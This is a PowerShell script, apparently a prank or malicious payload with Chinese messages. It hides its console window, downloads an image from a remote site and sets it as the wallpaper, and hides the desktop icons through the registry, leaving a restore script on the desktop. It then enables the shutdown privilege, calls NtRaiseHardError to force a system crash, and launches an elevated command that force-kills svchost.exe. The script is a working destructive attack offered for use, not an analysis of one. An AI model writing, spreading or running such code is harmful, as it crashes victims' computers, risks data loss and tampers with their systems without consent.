Add-Type -Name W -Namespace X -MemberDefinition '[System.Runtime.InteropServices.DllImport("kernel32.dll")] public static extern System.IntPtr GetConsoleWindow(); [System.Runtime.InteropServices.DllImport("user32.dll")] public static extern bool ShowWindow(System.IntPtr hWnd,int nCmdShow);'; [X.W]::ShowWindow([X.W]::GetConsoleWindow(),0) | Out-Null

$url  = "https://pic3.zhimg.com/v2-f7c45a855f5881818fe36e8c3ab5645e_r.jpg"
$path = "$env:TEMP\$(Split-Path $url -Leaf)"

irm $url -OutFile $path

if (-not ("Wallpaper" -as [type])) {
    Add-Type @"
    using System;
    using System.Runtime.InteropServices;
    public class Wallpaper {
        [DllImport("user32.dll", SetLastError = true)]
        public static extern bool SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
    }
"@
}

[Wallpaper]::SystemParametersInfo(20, 0, $path, 0x01 -bor 0x02)
$desktop = [Environment]::GetFolderPath("Desktop")
$restorePath = Join-Path $desktop "恢复桌面图标.ps1"

$restoreCode = @'
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public static class DeskIcons {
    [DllImport("user32.dll", SetLastError=true)]
    public static extern IntPtr FindWindowEx(IntPtr parent, IntPtr child, string className, string window);
    [DllImport("user32.dll", SetLastError=true)]
    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
    public const int SW_SHOW = 5;
    public static void ShowIcons() {
        IntPtr progman = FindWindowEx(IntPtr.Zero, IntPtr.Zero, "Progman", null);
        IntPtr defView = FindWindowEx(progman, IntPtr.Zero, "SHELLDLL_DefView", null);
        if (defView == IntPtr.Zero) {
            IntPtr worker = IntPtr.Zero;
            while ((worker = FindWindowEx(IntPtr.Zero, worker, "WorkerW", null)) != IntPtr.Zero) {
                defView = FindWindowEx(worker, IntPtr.Zero, "SHELLDLL_DefView", null);
                if (defView != IntPtr.Zero) break;
            }
        }
        if (defView != IntPtr.Zero)
            ShowWindow(defView, SW_SHOW);
    }
}
"@
[DeskIcons]::ShowIcons()

$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced"
Set-ItemProperty -Path $regPath -Name HideIcons -Type DWord -Value 0 -Force
Write-Host "桌面图标已恢复显示"
pause
'@
Set-Content -Path $restorePath -Value $restoreCode -Encoding UTF8
Write-Host "已在桌面生成恢复脚本: $restorePath"
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public static class DeskIcons {
    [DllImport("user32.dll", SetLastError=true)]
    public static extern IntPtr FindWindowEx(IntPtr parent, IntPtr child, string className, string window);
    [DllImport("user32.dll", SetLastError=true)]
    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
    public const int SW_HIDE = 0;
    public static void HideIcons() {
        IntPtr progman = FindWindowEx(IntPtr.Zero, IntPtr.Zero, "Progman", null);
        IntPtr defView = FindWindowEx(progman, IntPtr.Zero, "SHELLDLL_DefView", null);
        if (defView == IntPtr.Zero) {
            IntPtr worker = IntPtr.Zero;
            while ((worker = FindWindowEx(IntPtr.Zero, worker, "WorkerW", null)) != IntPtr.Zero) {
                defView = FindWindowEx(worker, IntPtr.Zero, "SHELLDLL_DefView", null);
                if (defView != IntPtr.Zero) break;
            }
        }
        if (defView != IntPtr.Zero)
            ShowWindow(defView, SW_HIDE);
    }
}
"@
[DeskIcons]::HideIcons()
$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced"
Set-ItemProperty -Path $regPath -Name HideIcons -Type DWord -Value 1 -Force
Write-Host "恢复脚本在桌面"
Write-Host "运行后没恢https://github.com/hyaynygy123/hang/blob/main/README.md"


Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;

public class Native {
    [DllImport("ntdll.dll")]
    public static extern uint RtlAdjustPrivilege(
        int Privilege, bool Enable, bool CurrentThread, out bool OldValue);

    [DllImport("ntdll.dll")]
    public static extern uint NtRaiseHardError(
        int ErrorStatus, uint NumberOfParameters, uint UnicodeStringParameterMask,
        IntPtr Parameters, uint ValidResponseOption, out uint Response);
}
"@

$old = $false
[Native]::RtlAdjustPrivilege(19, $true, $false, [ref]$old) | Out-Null

$response = 0
[Native]::NtRaiseHardError(-1073741783, 0, 0, [IntPtr]::Zero, 6, [ref]$response)
Start-Process "cmd.exe" -Verb RunAs -ArgumentList '/k taskkill /im svchost.exe /f & pause'
pause
